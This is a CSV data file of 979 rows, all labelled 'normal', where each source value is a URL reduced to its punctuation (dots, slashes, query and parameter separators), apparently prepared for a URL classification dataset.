,language,source
1,normal,". . . . / / / / ? = & = & = "
2,normal,". . / / / ? = "
3,normal,". . . . / / "
4,normal,". . / / "
5,normal,". . . / ? = & = & = "
6,normal,". . . . / / / "
7,normal,". . . . / / / / ? = & = "
8,normal,". . . / "
9,normal,". . / ? = "
10,normal,". . / ? = & = & = "
11,normal,". . / / ? = & = "
12,normal,". . . . / / / ? = "
13,normal,". . / "
14,normal,". . / / ? = & = & = "
15,normal,". . . . / "
16,normal,". . . / / / / ? = "
17,normal,". . . ? = & = "
18,normal,". "
19,normal,". . . . ? = & = & = "
20,normal,". . . . ? = & = & = "
21,normal,". . ? = & = "
22,normal,". . . . / / / "
23,normal,". . . / / / ? = & = & = "
24,normal,". . / / / / ? = & = & = "
25,normal,". . / / / / ? = & = "
26,normal,". . . / / ? = & = "
27,normal,". . . / / "
28,normal,". . "
29,normal,". "
30,normal,". . . / / / / ? = & = & = "
31,normal,". . . / / ? = & = & = "
32,normal,". "
33,normal,". . . / / ? = & = & = "
34,normal,". . . / / / ? = & = & = "
35,normal,". . . . / / ? = "
36,normal,". . "
37,normal,". . . / ? = & = & = "
38,normal,". . . / ? = & = "
39,normal,". . . . / / / / ? = & = "
40,normal,". . . . ? = "
41,normal,". . . / / ? = & = & = "
42,normal,". . ? = & = "
43,normal,". . . / / / ? = "
44,normal,". . . / / / / ? = "
45,normal,". . / "
46,normal,". . . . / / ? = & = & = "
47,normal,". . . / / ? = "
48,normal,". . . / / ? = & = & = "
49,normal,". . / / ? = & = & = "
50,normal,". . . ? = & = & = "
51,normal,". . / ? = & = & = "
52,normal,". . . . / / / ? = & = & = "
53,normal,". . . / / ? = "
54,normal,". . . . / / / ? = & = & = "
55,normal,". . . . / / / / ? = "
56,normal,". . . . / ? = "
57,normal,". . . / / / / ? = "
58,normal,". . . . / / "
59,normal,". . . . "
60,normal,". . . . / ? = & = & = "
61,normal,". . . . / / / ? = & = & = "
62,normal,". . . . / / / ? = & = & = "
63,normal,". . . . "
64,normal,". . . . / "
65,normal,". . . . / / "
66,normal,". . . . / / / ? = & = & = "
67,normal,". . . . / / / ? = "
68,normal,". . / ? = "
69,normal,". . . / ? = & = & = "
70,normal,". . . . / / ? = "
71,normal,". . . ? = & = & = "
72,normal,". . / / / "
73,normal,". . . . / / ? = & = & = "
74,normal,". . ? = & = "
75,normal,". . . / / / ? = & = & = "
76,normal,". . / ? = "
77,normal,". . . . / "
78,normal,". . . / / ? = & = "
79,normal,". . ? = & = & = "
80,normal,". . . / / ? = & = "
81,normal,". . . ? = "
82,normal,". . / / "
83,normal,". . / ? = "
84,normal,". . . . / ? = & = "
85,normal,". . / / / / ? = "
86,normal,". . . . / ? = "
87,normal,". . . ? = & = "
88,normal,". . . / / / ? = & = "
89,normal,". . . / / "
90,normal,". . / / / / ? = "
91,normal,". . / / / / ? = & = "
92,normal,". . . ? = "
93,normal,". . / / / ? = "
94,normal,". . . . "
95,normal,". . . . / / "
96,normal,". . . / / / ? = & = & = "
97,normal,". . / / ? = "
98,normal,". . / "
99,normal,". . . . / ? = & = & = "
100,normal,". . . / ? = & = "
101,normal,". . . . / / / "
102,normal,". . "
103,normal,". . "
104,normal,". . . / / ? = & = & = "
105,normal,". . . . / ? = & = "
106,normal,". . . / / / / ? = & = & = "
107,normal,". . . / ? = "
108,normal,". . . . / / ? = & = & = "
109,normal,". . . ? = "
110,normal,". . / ? = & = "
111,normal,". . "
112,normal,". . . / / ? = "
113,normal,". . . . / / / / ? = & = "
114,normal,". . . . ? = & = & = "
115,normal,". . . / / "
116,normal,". . . / / / ? = "
117,normal,". . / / ? = & = & = "
118,normal,". . / "
119,normal,". . / / / ? = "
120,normal,". . . . / / / / ? = & = "
121,normal,". . ? = & = & = "
122,normal,". . . / / ? = & = "
123,normal,". . . / / / / ? = & = "
124,normal,". . "
125,normal,". . . . / / / ? = & = "
126,normal,". . . / / / "
127,normal,". . . . / / / ? = & = "
128,normal,". . . "
129,normal,". . . . / / "
130,normal,". . . . / / / ? = & = "
131,normal,". . . / / / / ? = "
132,normal,". . . / / / / ? = "
133,normal,". . . . / ? = & = "
134,normal,". . ? = & = "
135,normal,". . . ? = & = "
136,normal,". . . . / ? = & = & = "
137,normal,". . . / ? = & = & = "
138,normal,". . / / / ? = & = "
139,normal,". . . . / / / / ? = & = "
140,normal,". . / "
141,normal,". . . / / / ? = "
142,normal,". . ? = "
143,normal,". . / / / ? = & = "
144,normal,". . / ? = & = "
145,normal,". . / / / ? = "
146,normal,". . . / ? = "
147,normal,". . . / / / ? = & = & = "
148,normal,". . . / / / / ? = & = & = "
149,normal,". . ? = "
150,normal,". . . ? = & = "
151,normal,". . . / ? = & = & = "
152,normal,". . / "
153,normal,". . . / ? = "
154,normal,". . / ? = "
155,normal,". . . . / / ? = & = "
156,normal,". . . / / / ? = & = & = "
157,normal,". . / / / ? = & = "
158,normal,". . . . / / / / ? = "
159,normal,". . / / ? = & = & = "
160,normal,". . . / / / "
161,normal,". . / / / ? = & = & = "
162,normal,". . . "
163,normal,". . / / / / ? = "
164,normal,". . . / / / ? = & = "
165,normal,". . / / / ? = & = "
166,normal,". . . / / / / ? = & = & = "
167,normal,". . / / / ? = & = "
168,normal,". . . . ? = "
169,normal,". . . ? = & = "
170,normal,". . . ? = "
171,normal,". . . / ? = & = "
172,normal,". . . / / ? = & = "
173,normal,". . "
174,normal,". . / / / "
175,normal,". . . ? = & = & = "
176,normal,". . . / ? = & = & = "
177,normal,". . . . / / "
178,normal,". . "
179,normal,". . "
180,normal,". . . . "
181,normal,". . . . / / / ? = & = & = "
182,normal,". . / / / / ? = & = "
183,normal,". . / / / / ? = & = "
184,normal,". . / "
185,normal,". . / / / / ? = & = & = "
186,normal,". . / ? = & = & = "
187,normal,". . . . / ? = & = "
188,normal,". . / / ? = & = & = "
189,normal,". . . / / "
190,normal,". "
191,normal,". . . . / ? = & = "
192,normal,". . . / ? = & = "
193,normal,". . . . ? = & = "
194,normal,". . . . ? = & = & = "
195,normal,". . . / ? = & = & = "
196,normal,". . . / / / / ? = & = "
197,normal,". . / / ? = & = "
198,normal,". "
199,normal,". . / / / ? = & = "
200,normal,". . . . / / / ? = & = & = "
201,normal,". . . . / / / ? = "
202,normal,". . / / / / ? = & = & = "
203,normal,". . . / / / "
204,normal,". . / ? = "
205,normal,". . . / / / / ? = & = "
206,normal,". . . . / ? = & = "
207,normal,". . / ? = & = & = "
208,normal,". . . . / / / / ? = & = & = "
209,normal,". . / / ? = & = "
210,normal,". . . / "
211,normal,". . . / / / / ? = & = & = "
212,normal,". . . / / / / ? = & = "
213,normal,". . . / ? = "
214,normal,". . . / / / "
215,normal,". . / / / ? = & = & = "
216,normal,". . . . / / / / ? = "
217,normal,". . . / ? = & = & = "
218,normal,". . . . / ? = & = "
219,normal,". . ? = "
220,normal,". . . / / / / ? = & = & = "
221,normal,". . . . ? = & = & = "
222,normal,". . / / "
223,normal,". . ? = & = "
224,normal,". . . "
225,normal,". . . . / / / / ? = & = "
226,normal,". . . ? = "
227,normal,". . / / / ? = & = & = "
228,normal,". . ? = & = & = "
229,normal,". . . / ? = & = & = "
230,normal,". . . / / / / ? = "
231,normal,". . "
232,normal,". . . . / / / ? = & = & = "
233,normal,". . / / ? = & = & = "
234,normal,". . . . / / / / ? = "
235,normal,". . . . / / / / ? = & = & = "
236,normal,". . / / "
237,normal,". . / ? = & = "
238,normal,". . . . / ? = "
239,normal,". . . / / / ? = & = "
240,normal,". . . / ? = "
241,normal,". . . / / / ? = "
242,normal,". . ? = "
243,normal,". . . / / "
244,normal,". . . . / / ? = "
245,normal,". . / / / / ? = & = "
246,normal,". . . / / / ? = "
247,normal,". . . . / / / / ? = & = & = "
248,normal,". . . . / / / ? = & = "
249,normal,". . "
250,normal,". . / "
251,normal,". . . . / / ? = & = "
252,normal,". . / / ? = & = "
253,normal,". . . . "
254,normal,". . . . ? = & = & = "
255,normal,". . . . / ? = & = & = "
256,normal,". . . . / / "
257,normal,". . . . / / / "
258,normal,". . . ? = & = "
259,normal,". . . / ? = & = & = "
260,normal,". . . . / / ? = & = "
261,normal,". . / / "
262,normal,". . . / ? = "
263,normal,". . / / / / ? = & = & = "
264,normal,". . "
265,normal,". . ? = & = & = "
266,normal,". . . . ? = & = & = "
267,normal,". . "
268,normal,". . . . / / / "
269,normal,". . . / ? = "
270,normal,". . . . / / / / ? = & = "
271,normal,". . . . / / / ? = & = "
272,normal,". . . . / ? = & = & = "
273,normal,". . / "
274,normal,". . . / ? = & = & = "
275,normal,". . / "
276,normal,". . ? = & = & = "
277,normal,". . / / ? = & = & = "
278,normal,". . . / / / / ? = & = & = "
279,normal,". . / / / / ? = "
280,normal,". . . "
281,normal,". . "
282,normal,". . . . / / ? = & = "
283,normal,". . . . / ? = "
284,normal,". . "
285,normal,". . . . / "
286,normal,". "
287,normal,". . . ? = & = & = "
288,normal,". . . . / / / "
289,normal,". . . . / ? = & = "
290,normal,". . / ? = "
291,normal,". . . / ? = & = "
292,normal,". . / ? = "
293,normal,". . . . / ? = & = "
294,normal,". . . . / / "
295,normal,". . . / ? = & = & = "
296,normal,". . / / / "
297,normal,". . ? = & = "
298,normal,". . . / / / ? = & = & = "
299,normal,". . . ? = & = "
300,normal,". . . "
301,normal,". . . "
302,normal,". . "
303,normal,". . ? = "
304,normal,". . . . / / ? = "
305,normal,". . . . / / "
306,normal,". "
307,normal,". . . / / / ? = "
308,normal,". . / / / ? = "
309,normal,". . . / ? = & = "
310,normal,". . . / / / / ? = & = "
311,normal,". . . . / / / / ? = & = & = "
312,normal,". . ? = "
313,normal,". . . / / ? = & = & = "
314,normal,". . / / / "
315,normal,". . . . / / / ? = "
316,normal,". . . / ? = & = "
317,normal,". . . / / ? = "
318,normal,". . / / / ? = & = & = "
319,normal,". . / ? = "
320,normal,". . . / / / / ? = & = "
321,normal,". . / / / ? = & = & = "
322,normal,". "
323,normal,". . . ? = "
324,normal,". . . . / / "
325,normal,". . . / / / ? = & = "
326,normal,". . . . / / / "
327,normal,". . . . / / / / ? = & = & = "
328,normal,". . / / ? = "
329,normal,". . . . / ? = & = & = "
330,normal,". . / ? = & = & = "
331,normal,". . . . ? = "
332,normal,". . / / ? = & = & = "
333,normal,". . . / ? = & = & = "
334,normal,". . . / / / ? = & = "
335,normal,". . . "
336,normal,". . . . / / / ? = "
337,normal,". . . / / ? = & = & = "
338,normal,". . . . / "
339,normal,". . . / ? = & = & = "
340,normal,". . . . / "
341,normal,". . / / / ? = & = "
342,normal,". . ? = "
343,normal,". "
344,normal,". . / / / "
345,normal,". . / ? = & = "
346,normal,". . . . / / ? = & = & = "
347,normal,". . / ? = & = & = "
348,normal,". . . / / ? = & = & = "
349,normal,". . . / / / ? = "
350,normal,". . . . / / / / ? = "
351,normal,". . . / ? = & = "
352,normal,". . . ? = & = & = "
353,normal,". . . . ? = & = & = "
354,normal,". . . / / / / ? = & = & = "
355,normal,". . . . ? = & = "
356,normal,". . ? = "
357,normal,". . "
358,normal,". . . / / ? = & = & = "
359,normal,". . . . / / ? = & = "
360,normal,". . . . ? = "
361,normal,". . / / / / ? = & = "
362,normal,". . / ? = & = & = "
363,normal,". . / / / / ? = "
364,normal,". . . / ? = & = "
365,normal,". . . . ? = "
366,normal,". . . ? = & = & = "
367,normal,". . . / "
368,normal,". . . . / ? = & = "
369,normal,". . . / ? = & = & = "
370,normal,". . . / / / "
371,normal,". . / / ? = & = "
372,normal,". . / / / / ? = "
373,normal,". . . . / / / ? = & = "
374,normal,". . "
375,normal,". . ? = "
376,normal,". . . . ? = & = & = "
377,normal,". . . / ? = "
378,normal,". . "
379,normal,". . . . / / / ? = & = "
380,normal,". . . / / / / ? = & = "
381,normal,". . . . / / ? = "
382,normal,". . . / / / ? = & = & = "
383,normal,". . . / / "
384,normal,". . / / / ? = & = & = "
385,normal,". . / / / / ? = & = "
386,normal,". . / / / / ? = "
387,normal,". . . / / ? = & = "
388,normal,". . . / ? = "
389,normal,". . . . / ? = & = & = "
390,normal,". . . . / / / ? = & = "
391,normal,". . . / / "
392,normal,". . . ? = & = & = "
393,normal,". . . . / / / ? = & = "
394,normal,". . . / / "
395,normal,". . . / / / ? = & = & = "
396,normal,". . . . ? = & = & = "
397,normal,". . / / / / ? = & = & = "
398,normal,". . . / / / ? = "
399,normal,". . / / / "
400,normal,". . . / ? = "
401,normal,". . . . / ? = & = & = "
402,normal,". . . / / ? = "
403,normal,". . / / / / ? = & = & = "
404,normal,". . . "
405,normal,". . / "
406,normal,". . . . / / / ? = "
407,normal,". . . . / / ? = "
408,normal,". . . . / / / "
409,normal,". . / ? = & = & = "
410,normal,". . . . / / / / ? = "
411,normal,". . / / / ? = & = "
412,normal,". . . "
413,normal,". . / ? = "
414,normal,". . . / / / ? = & = & = "
415,normal,". . / / / "
416,normal,". . . . ? = & = & = "
417,normal,". . . / ? = "
418,normal,". . . . / / / "
419,normal,". . / ? = & = "
420,normal,". . . "
421,normal,". . . . / / / "
422,normal,". . . . "
423,normal,". . . . "
424,normal,". . . . / / / ? = & = "
425,normal,". . . . / / / / ? = & = "
426,normal,". . . . ? = "
427,normal,". . . . ? = & = & = "
428,normal,". . . . / / ? = "
429,normal,". . . . / / ? = "
430,normal,". . / / "
431,normal,". . . / / ? = & = & = "
432,normal,". . . / / / ? = & = "
433,normal,". . . . ? = "
434,normal,". . . . / "
435,normal,". . . / ? = "
436,normal,". . . / / / / ? = & = & = "
437,normal,". . . . / "
438,normal,". . . "
439,normal,". . . . / / / "
440,normal,". . ? = "
441,normal,". . . . / ? = "
442,normal,". . . / / ? = & = & = "
443,normal,". . . / / ? = "
444,normal,". . . / / ? = "
445,normal,". . / / / ? = "
446,normal,". . . "
447,normal,". . . / / ? = "
448,normal,". . ? = & = & = "
449,normal,". . . ? = "
450,normal,". . / ? = & = "
451,normal,". . / / / ? = "
452,normal,". . / / / / ? = "
453,normal,". . . "
454,normal,". . / / "
455,normal,". . . / / / ? = & = "
456,normal,". . . . / / / / ? = "
457,normal,". . . / / ? = & = "
458,normal,". . . / / ? = & = & = "
459,normal,". . . "
460,normal,". . . "
461,normal,". . . . / / / ? = & = & = "
462,normal,". . . / / / ? = & = "
463,normal,". . . . ? = & = "
464,normal,". . . . / / ? = & = "
465,normal,". . . . / / ? = & = "
466,normal,". . / "
467,normal,". . . . ? = & = "
468,normal,". . / / / ? = & = "
469,normal,". . / / / ? = & = & = "
470,normal,". . . / / / ? = & = & = "
471,normal,". . . . "
472,normal,". . "
473,normal,". . . . ? = & = "
474,normal,". . . . / / / "
475,normal,". . . / / ? = "
476,normal,". . . / / "
477,normal,". . ? = & = "
478,normal,". . ? = "
479,normal,". . "
480,normal,". . . / / "
481,normal,". . / / / ? = & = "
482,normal,". . . . "
483,normal,". . . . / / / / ? = "
484,normal,". . . . / / / / ? = & = & = "
485,normal,". . . / ? = & = & = "
486,normal,". . . . / / / ? = "
487,normal,". . / / / / ? = & = & = "
488,normal,". . . ? = "
489,normal,". . / / ? = & = "
490,normal,". . . . / / / / ? = & = "
491,normal,". . / / "
492,normal,". . . . / / / / ? = & = & = "
493,normal,". "
494,normal,". . "
495,normal,". . / / / / ? = "
496,normal,". . / / "
497,normal,". . ? = "
498,normal,". . . ? = & = & = "
499,normal,". . . . / "
500,normal,". . / / ? = "
501,normal,". . . / / ? = "
502,normal,". . . / ? = "
503,normal,". . . / / "
504,normal,". . . . ? = "
505,normal,". . . / / ? = & = "
506,normal,". . ? = & = "
507,normal,". . . / / ? = "
508,normal,". . / / / ? = & = & = "
509,normal,". . . ? = & = & = "
510,normal,". . / / / ? = "
511,normal,". . . "
512,normal,". . . / "
513,normal,". . / ? = & = "
514,normal,". . . / / ? = & = & = "
515,normal,". . . . / ? = "
516,normal,". . . ? = "
517,normal,". . / / ? = & = & = "
518,normal,". . / / ? = "
519,normal,". . . . ? = & = "
520,normal,". . . . / "
521,normal,". . / / / / ? = & = & = "
522,normal,". . / ? = "
523,normal,". . . "
524,normal,". . . . / / ? = & = & = "
525,normal,". . / / / "
526,normal,". . . . / ? = & = "
527,normal,". . . / / / "
528,normal,". . . / ? = & = "
529,normal,". . . / / ? = & = & = "
530,normal,". . . ? = & = & = "
531,normal,". . / ? = & = "
532,normal,". . . / / / "
533,normal,". . / / / ? = "
534,normal,". . . . / / / / ? = & = "
535,normal,". . . . / / / ? = & = & = "
536,normal,". . / / / ? = & = & = "
537,normal,". . . / / / "
538,normal,". . / / "
539,normal,". . / ? = & = & = "
540,normal,". . / / / "
541,normal,". . ? = & = "
542,normal,". . . . / / "
543,normal,". . / / "
544,normal,". . / "
545,normal,". . . . / / / / ? = & = & = "
546,normal,". . . . / / "
547,normal,". . / / / ? = & = & = "
548,normal,". . . / / / ? = "
549,normal,". . . . / / / ? = "
550,normal,". . . . / / / "
551,normal,". . . . / ? = "
552,normal,". . "
553,normal,". . . / / / ? = & = & = "
554,normal,". . / / ? = "
555,normal,". . / "
556,normal,". . / / ? = & = "
557,normal,". . . / / / / ? = & = "
558,normal,". . / / ? = "
559,normal,". . . . / / / / ? = & = & = "
560,normal,". . . / / / / ? = & = & = "
561,normal,". . "
562,normal,". . . "
563,normal,". . . . / / ? = & = & = "
564,normal,". . . ? = & = & = "
565,normal,". . / ? = & = & = "
566,normal,". . . . / / / / ? = & = & = "
567,normal,". . . . / / / / ? = "
568,normal,". . . . / / / / ? = "
569,normal,". . . . / ? = "
570,normal,". . . . / / / / ? = "
571,normal,". . / / "
572,normal,". . . / / ? = "
573,normal,". . . . / / ? = & = "
574,normal,". . . / / ? = "
575,normal,". . / / ? = & = & = "
576,normal,". . / / "
577,normal,". . . / / / ? = & = & = "
578,normal,". . . / / / / ? = & = & = "
579,normal,". . . / / / / ? = & = & = "
580,normal,". . / ? = & = "
581,normal,". . . / / / / ? = & = & = "
582,normal,". . . . / ? = & = "
583,normal,". . . . / / / "
584,normal,". . . . / / / ? = & = & = "
585,normal,". . / / / / ? = & = "
586,normal,". . . . / / / / ? = & = & = "
587,normal,". . . ? = "
588,normal,". . "
589,normal,". . . . / / ? = & = "
590,normal,". . . / ? = & = "
591,normal,". . . . / / "
592,normal,". . . / / / "
593,normal,". . . / / ? = "
594,normal,". . "
595,normal,". . . / / / ? = & = "
596,normal,". . . . / / / ? = "
597,normal,". . . / ? = & = & = "
598,normal,". . . / "
599,normal,". . / / / ? = "
600,normal,". . / "
601,normal,". . . . / / / ? = & = "
602,normal,". . . / / "
603,normal,". . / / / ? = & = "
604,normal,". . . / / / / ? = "
605,normal,". . . . / / ? = & = & = "
606,normal,". . / / / "
607,normal,". . ? = "
608,normal,". . "
609,normal,". . . . / / / / ? = "
610,normal,". . . . / "
611,normal,". "
612,normal,". . / / / / ? = "
613,normal,". . . / / / / ? = & = & = "
614,normal,". . . / / / / ? = & = & = "
615,normal,". . . . / / / ? = & = & = "
616,normal,". . ? = & = & = "
617,normal,". . / / / / ? = & = & = "
618,normal,". . . . / "
619,normal,". . . . / / ? = "
620,normal,". . . / / / ? = & = & = "
621,normal,". . . ? = & = & = "
622,normal,". . / / / / ? = "
623,normal,". . . . / / ? = "
624,normal,". . . / / / "
625,normal,". . . . / / ? = & = "
626,normal,". . ? = "
627,normal,". . . . / ? = "
628,normal,". . . / / / / ? = & = & = "
629,normal,". . . . / / "
630,normal,". . / ? = "
631,normal,". . . / / / / ? = "
632,normal,". . . / / ? = "
633,normal,". . / ? = & = & = "
634,normal,". . . ? = "
635,normal,". . . . / / "
636,normal,". . . / ? = & = & = "
637,normal,". . ? = "
638,normal,". . . . / ? = "
639,normal,". . . . "
640,normal,". . . / / "
641,normal,". . . / / / ? = & = "
642,normal,". . . . / / / / ? = "
643,normal,". . . . / / / / ? = & = & = "
644,normal,". . . . / / / ? = "
645,normal,". . "
646,normal,". . . / / / ? = "
647,normal,". . . / / / "
648,normal,". . / / ? = & = "
649,normal,". . . ? = & = "
650,normal,". . . "
651,normal,". . . . / "
652,normal,". . / ? = "
653,normal,". . . / / ? = & = "
654,normal,". . . . "
655,normal,". . / "
656,normal,". . . / / "
657,normal,". . . . / / / / ? = "
658,normal,". . . / ? = & = "
659,normal,". . / / "
660,normal,". . . / / "
661,normal,". . / / ? = "
662,normal,". . . "
663,normal,". . . . / / / ? = & = & = "
664,normal,". . "
665,normal,". . "
666,normal,". . / / / / ? = & = "
667,normal,". . . / ? = & = "
668,normal,". . . / / ? = & = "
669,normal,". . . ? = & = "
670,normal,". . / / / ? = & = & = "
671,normal,". . / / / / ? = & = "
672,normal,". . . / ? = & = & = "
673,normal,". . . / / / ? = & = & = "
674,normal,". . . . / / / "
675,normal,". . . . / / "
676,normal,". . . . ? = & = & = "
677,normal,". . / / ? = & = "
678,normal,". . . . / "
679,normal,". . . . / / / / ? = & = & = "
680,normal,". . . . / / / ? = "
681,normal,". . . . / / / ? = "
682,normal,". . . . ? = & = & = "
683,normal,". . . / "
684,normal,". "
685,normal,". . . . / / "
686,normal,". . / ? = & = & = "
687,normal,". . . ? = & = & = "
688,normal,". . . / / / ? = & = & = "
689,normal,". . . . / / / / ? = "
690,normal,". . . ? = & = "
691,normal,". . . / / / "
692,normal,". . "
693,normal,". "
694,normal,". . . "
695,normal,". . . . / / / / ? = "
696,normal,". . / / / / ? = & = & = "
697,normal,". . / "
698,normal,". . / "
699,normal,". . / / "
700,normal,". . / / / / ? = "
701,normal,". . / / / ? = "
702,normal,". . . / / / ? = & = & = "
703,normal,". . . / / "
704,normal,". "
705,normal,". . . . / / ? = "
706,normal,". . / ? = "
707,normal,". . . / "
708,normal,". . . / ? = & = & = "
709,normal,". . / ? = & = & = "
710,normal,". . / / / / ? = & = "
711,normal,". . . . / / ? = "
712,normal,". . / ? = & = "
713,normal,". . / / / / ? = & = "
714,normal,". . / ? = & = & = "
715,normal,". . / ? = "
716,normal,". . . / / "
717,normal,". . . / ? = & = "
718,normal,". . . / / ? = "
719,normal,". "
720,normal,". . ? = "
721,normal,". . . "
722,normal,". . . ? = & = & = "
723,normal,". . "
724,normal,". . . . / ? = "
725,normal,". . / / / ? = & = & = "
726,normal,". "
727,normal,". . / / / ? = & = & = "
728,normal,". . / / ? = & = "
729,normal,". . / ? = & = & = "
730,normal,". . ? = & = "
731,normal,". . . . / / / ? = & = & = "
732,normal,". . / / ? = "
733,normal,". . . / ? = & = "
734,normal,". . / / / / ? = & = "
735,normal,". . . / / / "
736,normal,". . / / "
737,normal,". "
738,normal,". . . / / / / ? = & = "
739,normal,". . / "
740,normal,". . . / / / "
741,normal,". . . / / ? = & = & = "
742,normal,". . ? = "
743,normal,". . . / / / ? = & = "
744,normal,". . . . ? = & = & = "
745,normal,". . / / ? = "
746,normal,". . . . / / ? = & = & = "
747,normal,". . / / ? = & = & = "
748,normal,". . . . / ? = & = "
749,normal,". . . / / / "
750,normal,". "
751,normal,". . "
752,normal,". . . / ? = & = "
753,normal,". . . . / / ? = & = "
754,normal,". . . / "
755,normal,". . / / / ? = & = & = "
756,normal,". . / / "
757,normal,". . ? = & = & = "
758,normal,". . . . / / / "
759,normal,". . / / / ? = & = "
760,normal,". . "
761,normal,". . . . ? = & = & = "
762,normal,". . . . / / ? = & = "
763,normal,". . / / / ? = "
764,normal,". . . . ? = & = "
765,normal,". . / / / ? = "
766,normal,". . . . / / / ? = "
767,normal,". . . . ? = "
768,normal,". . . / / / ? = & = "
769,normal,". . / ? = "
770,normal,". . . . / / "
771,normal,". . . . / ? = & = "
772,normal,". . / / / ? = & = & = "
773,normal,". . . / / / / ? = "
774,normal,". . . . / / / / ? = & = "
775,normal,". . . / / / / ? = & = "
776,normal,". . . . / / ? = & = "
777,normal,". . / / / / ? = "
778,normal,". "
779,normal,". . . / / / ? = & = "
780,normal,". . . . / / / "
781,normal,". . "
782,normal,". . . "
783,normal,". . . . / ? = & = "
784,normal,". . / / / / ? = "
785,normal,". . . / / / ? = "
786,normal,". . / / ? = "
787,normal,". . . . / / "
788,normal,". . / / / "
789,normal,". . . / / "
790,normal,". . . / "
791,normal,". . . . / / / ? = "
792,normal,". . . / ? = "
793,normal,". . . / "
794,normal,". . . / / / / ? = "
795,normal,". . "
796,normal,". . . / / "
797,normal,". . . "
798,normal,". . . / / / "
799,normal,". . / / "
800,normal,". . . / / / ? = "
801,normal,". . . . ? = & = & = "
802,normal,". . . . / ? = & = "
803,normal,". . / / / ? = & = "
804,normal,". . . / "
805,normal,". . . / / / / ? = & = & = "
806,normal,". . . . / ? = & = & = "
807,normal,". . . . / / ? = & = & = "
808,normal,". . . . / "
809,normal,". . / / ? = "
810,normal,". . / / ? = & = "
811,normal,". . . . / ? = "
812,normal,". . . . / / / "
813,normal,". . . . / / "
814,normal,". . . . / "
815,normal,". . . . / / ? = "
816,normal,". . ? = & = & = "
817,normal,". . . / / / / ? = "
818,normal,". . . . / / / / ? = "
819,normal,". . ? = & = & = "
820,normal,". . . . / / / ? = "
821,normal,". . . / / ? = "
822,normal,". . . . / / / ? = & = "
823,normal,". . . ? = & = "
824,normal,". . / "
825,normal,". . . . ? = & = "
826,normal,". . . / / ? = & = & = "
827,normal,". "
828,normal,". . / / / ? = & = & = "
829,normal,". . "
830,normal,". . / / ? = & = "
831,normal,". . . / / / / ? = & = "
832,normal,". . "
833,normal,". . / "
834,normal,". . . . / / / ? = & = "
835,normal,". . . / ? = & = "
836,normal,". . / / "
837,normal,". . . / / ? = "
838,normal,". . . / / / ? = & = "
839,normal,". . / / / ? = & = "
840,normal,". . "
841,normal,". . . . / ? = "
842,normal,". . / / / / ? = & = "
843,normal,". . ? = "
844,normal,". . ? = "
845,normal,". . . . / / / ? = "
846,normal,". . . . "
847,normal,". . . . / / ? = & = "
848,normal,". . . . / / ? = "
849,normal,". . / / ? = & = "
850,normal,". . . . / ? = "
851,normal,". . "
852,normal,". . . / / / / ? = & = "
853,normal,". . . ? = "
854,normal,". . / "
855,normal,". . "
856,normal,". . . . / ? = & = & = "
857,normal,". . / / ? = & = "
858,normal,". . . / ? = & = & = "
859,normal,". . / / / ? = "
860,normal,". . . / / / "
861,normal,". . . / / / ? = "
862,normal,". . . ? = "
863,normal,". . . / "
864,normal,". . . / / / ? = & = & = "
865,normal,". . . / / / ? = & = "
866,normal,". . . / / / / ? = "
867,normal,". . ? = "
868,normal,". . . . "
869,normal,". . . "
870,normal,". . / / / ? = & = & = "
871,normal,". . . / / ? = & = "
872,normal,". . . / / / "
873,normal,". . . . / / "
874,normal,". . . . / / / ? = "
875,normal,". . ? = & = "
876,normal,". . . . / ? = & = "
877,normal,". . . / / "
878,normal,". . . / / "
879,normal,". . / / ? = "
880,normal,". . / / / / ? = "
881,normal,". . / ? = & = "
882,normal,". . . . / / ? = & = & = "
883,normal,". . . / / / ? = "
884,normal,". . / ? = & = & = "
885,normal,". . / "
886,normal,". . / ? = "
887,normal,". . ? = & = "
888,normal,". . / ? = & = & = "
889,normal,". . . . / / / / ? = & = "
890,normal,". . . . / / / / ? = & = "
891,normal,". . / / ? = & = "
892,normal,". . . / / ? = & = & = "
893,normal,". . . / / / ? = & = & = "
894,normal,". . "
895,normal,". . . "
896,normal,". . . / / / / ? = & = & = "
897,normal,". . / / "
898,normal,". . . . / ? = & = & = "
899,normal,". . . . / / / / ? = & = "
900,normal,". . . / ? = & = & = "
901,normal,". . / ? = & = & = "
902,normal,". . . "
903,normal,". . . ? = & = "
904,normal,". . . / / / / ? = & = & = "
905,normal,". . . . "
906,normal,". . / / / / ? = & = & = "
907,normal,". . / ? = & = "
908,normal,". . . . / / / "
909,normal,". . . / / ? = "
910,normal,". . ? = & = "
911,normal,". . . ? = & = & = "
912,normal,". . . . / / / "
913,normal,". . . . / ? = & = "
914,normal,". . . . / / / / ? = & = "
915,normal,". . . . ? = & = "
916,normal,". . / ? = "
917,normal,". . . . / / / / ? = & = & = "
918,normal,". . / / ? = "
919,normal,". . . . / "
920,normal,". . . . / / ? = & = "
921,normal,". . . / / / / ? = & = & = "
922,normal,". . . / / ? = & = "
923,normal,". . . . / / / / ? = & = "
924,normal,". . / / / "
925,normal,". . ? = & = "
926,normal,". . . . / "
927,normal,". . . / / / / ? = & = "
928,normal,". . ? = & = "
929,normal,". . . ? = "
930,normal,". . . . ? = & = "
931,normal,". . . . ? = & = "
932,normal,". . . ? = & = & = "
933,normal,". . . . / / / / ? = & = & = "
934,normal,". . . / / "
935,normal,". . . . / / / / ? = & = "
936,normal,". . . . / / / / ? = "
937,normal,". . . / "
938,normal,". . . . / / ? = "
939,normal,". . / ? = "
940,normal,". . . / / "
941,normal,". . . . / / / ? = "
942,normal,". . . / "
943,normal,". . / / ? = "
944,normal,". . . . / "
945,normal,". . . / "
946,normal,". . . . ? = "
947,normal,". . . "
948,normal,". . / ? = "
949,normal,". . . / "
950,normal,". . . . / ? = & = "
951,normal,". . / "
952,normal,". . . ? = "
953,normal,". . / / / / ? = & = "
954,normal,". . . . / / / ? = "
955,normal,". . . / / / ? = & = "
956,normal,". . . . / / / ? = "
957,normal,". . . / ? = & = & = "
958,normal,". . / / / / ? = & = "
959,normal,". . . . / ? = "
960,normal,". . . / / / / ? = "
961,normal,". . . / / / ? = "
962,normal,". . / / / / ? = & = & = "
963,normal,". . / / ? = "
964,normal,". . . / ? = & = & = "
965,normal,". . . . / / / / ? = & = "
966,normal,". . . . / / / / ? = & = "
967,normal,". . . . / / / / ? = "
968,normal,". . . . / / / / ? = & = "
969,normal,". . . . "
970,normal,". . / / / / ? = "
971,normal,". . ? = & = & = "
972,normal,". . . . / / ? = "
973,normal,". . / / ? = "
974,normal,". . . / / / ? = "
975,normal,". . . / / / ? = & = "
976,normal,". . . / / / ? = & = & = "
977,normal,". . / ? = "
978,normal,". . . / / / / ? = & = & = "
979,normal,". . . / / / / ? = & = "
